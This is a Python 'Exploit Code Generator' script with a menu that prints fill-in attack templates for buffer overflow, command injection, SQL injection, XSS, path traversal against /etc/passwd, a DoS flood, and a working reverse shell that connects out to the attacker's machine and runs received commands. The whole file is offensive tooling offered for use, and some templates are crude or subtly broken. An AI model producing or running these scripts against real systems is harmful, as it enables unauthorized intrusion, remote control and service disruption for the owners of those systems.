import os
import pyfiglet

# Function to clear the screen
def clear_screen():
    """Clears the screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

# Function to display the banner using pyfiglet with slant font
def show_banner():
    """Displays the banner with 'Exploit Code Generator' using pyfiglet."""
    ascii_banner = pyfiglet.figlet_format("Exploit Code Generator", font="slant")
    print(ascii_banner)
    print("- By Mr.CodeX\n")

# Function to generate Buffer Overflow exploit code
def generate_buffer_overflow(target_ip, target_port, buffer_size, return_address):
    """Generates a buffer overflow exploit code template."""
    exploit_code = f"""
    # Buffer Overflow Exploit Template
    import socket

    target_ip = '{target_ip}'
    target_port = {target_port}
    buffer_size = {buffer_size}  # Adjust according to the vulnerability
    return_address = {return_address}  # The address to jump to (e.g., shellcode location)

    # Create a socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))

    # Create the malicious buffer
    buffer = 'A' * buffer_size  # Filling the buffer with 'A's
    buffer += return_address  # Add the return address for the exploit

    # Send the exploit payload
    s.send(buffer.encode())

    # Close the connection
    s.close()

    print("[INFO] Buffer Overflow Exploit Sent!")
    """
    print(exploit_code)

# Function to generate Command Injection exploit code
def generate_command_injection(target_ip, target_port, command):
    """Generates a command injection exploit code template."""
    exploit_code = f"""
    # Command Injection Exploit Template
    import socket

    target_ip = '{target_ip}'
    target_port = {target_port}
    command = '{command}'  # The command to execute on the target system

    # Create a socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))

    # Send the injected command
    s.send(command.encode())

    # Receive the response (if any)
    response = s.recv(1024)
    print("[INFO] Response: ", response.decode())

    # Close the connection
    s.close()

    print("[INFO] Command Injection Sent!")
    """
    print(exploit_code)

# Function to generate SQL Injection exploit code
def generate_sql_injection(target_url, parameter, injected_sql):
    """Generates a SQL Injection exploit code template."""
    exploit_code = f"""
    # SQL Injection Exploit Template
    import requests

    target_url = '{target_url}'
    parameter = '{parameter}'  # The vulnerable parameter (e.g., 'id')
    injected_sql = '{injected_sql}'  # The SQL injection payload (e.g., '1 OR 1=1')

    # Make the request with the injected SQL
    response = requests.get(target_url, params={{parameter: injected_sql}})

    # Check if the SQL injection is successful (e.g., by looking for a specific keyword in the response)
    if "Welcome" in response.text:
        print("[INFO] SQL Injection successful!")
    else:
        print("[INFO] SQL Injection failed!")
    """
    print(exploit_code)

# Function to generate XSS exploit code
def generate_xss_exploit(target_url, script):
    """Generates a Cross-Site Scripting (XSS) exploit code template."""
    exploit_code = f"""
    # XSS Exploit Template
    import requests

    target_url = '{target_url}'
    script = '{script}'  # The XSS payload (e.g., '<script>alert("XSS")</script>')

    # Send the malicious script via a GET request
    response = requests.get(target_url, params={{'input': script}})

    # Check if the script was reflected in the response
    if script in response.text:
        print("[INFO] XSS Exploit successful!")
    else:
        print("[INFO] XSS Exploit failed!")
    """
    print(exploit_code)

# Function to generate Reverse Shell exploit code
def generate_reverse_shell(local_ip, local_port, target_ip, target_port):
    """Generates a Reverse Shell exploit code template."""
    exploit_code = f"""
    # Reverse Shell Exploit Template
    import socket
    import subprocess
    import os

    # Target machine details
    target_ip = '{target_ip}'
    target_port = {target_port}

    # Attacker's machine (where the shell will connect)
    local_ip = '{local_ip}'
    local_port = {local_port}

    # Connect back to the attacker's machine
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((local_ip, local_port))

    # Start a subprocess for the shell
    while True:
        # Receive command from attacker
        command = s.recv(1024).decode()

        # If the command is 'exit', close the connection
        if command.lower() == 'exit':
            break

        # Execute the command and send the result back
        result = subprocess.run(command, shell=True, capture_output=True)
        s.send(result.stdout + result.stderr)

    # Close the connection
    s.close()
    """
    print(exploit_code)

# Function to generate DoS exploit code
def generate_dos_attack(target_ip, target_port, flood_duration):
    """Generates a Denial of Service (DoS) exploit code template."""
    exploit_code = f"""
    # DoS Attack Exploit Template
    import socket
    import time

    target_ip = '{target_ip}'
    target_port = {target_port}
    flood_duration = {flood_duration}  # Duration of the flood in seconds

    # Create a socket for the attack
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Start the attack
    start_time = time.time()
    while time.time() - start_time < flood_duration:
        try:
            s.connect((target_ip, target_port))
            s.send(b'GET / HTTP/1.1\r\n')
        except:
            pass

    s.close()
    print("[INFO] DoS Attack completed!")
    """
    print(exploit_code)

# Function to generate Path Traversal exploit code
def generate_path_traversal_exploit(target_url, file_name):
    """Generates a Path Traversal exploit code template."""
    exploit_code = f"""
    # Path Traversal Exploit Template
    import requests

    target_url = '{target_url}'
    file_name = '{file_name}'  # The file to read, such as '/etc/passwd'

    # Send the path traversal payload
    response = requests.get(target_url, params={{'file': file_name}})

    # Check for the content of the file
    if "root:x:0:0:root" in response.text:
        print("[INFO] Path Traversal Exploit successful!")
    else:
        print("[INFO] Path Traversal Exploit failed!")
    """
    print(exploit_code)

# Main function
def main():
    """Main function to run the Exploit Code Generator."""
    clear_screen()  # Clear the screen
    show_banner()   # Show the banner
    
    while True:
        print("\nSelect an option:")
        print("1. Generate Buffer Overflow Exploit")
        print("2. Generate Command Injection Exploit")
        print("3. Generate SQL Injection Exploit")
        print("4. Generate XSS Exploit")
        print("5. Generate Reverse Shell Exploit")
        print("6. Generate DoS Attack Exploit")
        print("7. Generate Path Traversal Exploit")
        print("8. Exit")

        try:
            choice = input("\nEnter your choice (1/2/3/4/5/6/7/8): ")

            if choice == '1':
                target_ip = input("\nEnter the target IP address: ")
                target_port = int(input("Enter the target port number: "))
                buffer_size = int(input("Enter the buffer size: "))
                return_address = input("Enter the return address (e.g., 0xdeadbeef): ")
                generate_buffer_overflow(target_ip, target_port, buffer_size, return_address)

            elif choice == '2':
                target_ip = input("\nEnter the target IP address: ")
                target_port = int(input("Enter the target port number: "))
                command = input("Enter the command to inject: ")
                generate_command_injection(target_ip, target_port, command)

            elif choice == '3':
                target_url = input("\nEnter the target URL: ")
                parameter = input("Enter the parameter to inject (e.g., id): ")
                injected_sql = input("Enter the SQL injection payload (e.g., 1 OR 1=1): ")
                generate_sql_injection(target_url, parameter, injected_sql)

            elif choice == '4':
                target_url = input("\nEnter the target URL: ")
                script = input("Enter the XSS payload (e.g., <script>alert('XSS')</script>): ")
                generate_xss_exploit(target_url, script)

            elif choice == '5':
                local_ip = input("\nEnter your local IP address: ")
                local_port = int(input("Enter your local port: "))
                target_ip = input("Enter the target IP address: ")
                target_port = int(input("Enter the target port number: "))
                generate_reverse_shell(local_ip, local_port, target_ip, target_port)

            elif choice == '6':
                target_ip = input("\nEnter the target IP address: ")
                target_port = int(input("Enter the target port number: "))
                flood_duration = int(input("Enter the flood duration in seconds: "))
                generate_dos_attack(target_ip, target_port, flood_duration)

            elif choice == '7':
                target_url = input("\nEnter the target URL: ")
                file_name = input("Enter the file name to read (e.g., /etc/passwd): ")
                generate_path_traversal_exploit(target_url, file_name)

            elif choice == '8':
                print("\nExiting...\n")
                break

            else:
                print("[ERROR] Invalid choice! Please select a valid option.\n")

        except KeyboardInterrupt:
            print("\n\n[INFO] Exiting the program gracefully...\n")
            break

if __name__ == "__main__":
    main()
